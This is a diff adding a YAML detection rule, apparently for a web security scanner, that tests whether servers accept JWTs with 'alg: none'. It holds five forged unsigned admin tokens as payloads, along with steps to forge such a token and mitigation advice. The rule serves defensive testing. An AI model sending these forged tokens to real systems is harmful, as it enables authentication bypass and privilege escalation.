@@ -1,0 +1,56 @@
+rule_name: JWT None Algorithm Attack
+description: "Detects servers that accept JWTs signed with 'alg: none', bypassing signature verification entirely."
+
+transform:
+  header:
+    transformations:
+      - replace_all_values_one_by_one:
+          # alg: "none" — sub: "1", role: "admin"
+          - "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
+          # alg: "None" (capital N)
+          - "Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
+          # alg: "NONE" (all caps)
+          - "Bearer eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
+          # alg: "none" — sub: "admin", role: "admin"
+          - "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0."
+          # without Bearer prefix (raw token)
+          - "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
+
+match_on:
+  status: 200
+  header:
+    Content-Type:
+      contains: "json"
+
+report:
+  title: "JWT None Algorithm Attack - Signature Verification Bypass"
+  description: |
+    The application accepted a JWT with 'alg: none', meaning the server did not verify
+    the token signature. An attacker can forge arbitrary JWT claims (e.g., role: "admin")
+    without knowing the signing secret.
+
+    Original Request:
+    {{original}}
+
+    Transformed Request:
+    {{req}}
+
+    Response:
+    {{res}}
+
+  cwe: "CWE-347"
+  severity: critical
+  cvssScore: "9.8"
+  mitigation: |
+    1. Explicitly whitelist allowed signing algorithms (e.g., RS256, HS256).
+    2. Reject any JWT with alg: 'none' or an empty/missing signature.
+    3. Use a well-maintained JWT library with strict algorithm enforcement.
+    4. Validate the algorithm in the JWT header server-side against your expected algorithm.
+  stepsToReproduce: |
+    1. Take a valid JWT from the Authorization header.
+    2. Decode the header, change "alg" to "none".
+    3. Re-encode as header.payload. with an empty signature (trailing dot).
+    4. Send the forged token to {{req.url}}.
+    5. Observe server returns 200 OK with a JSON response.
+  tags: "jwt,authentication,bypass,critical,token-forgery"
+  impact: "Complete authentication bypass, privilege escalation to any user/role including admin."
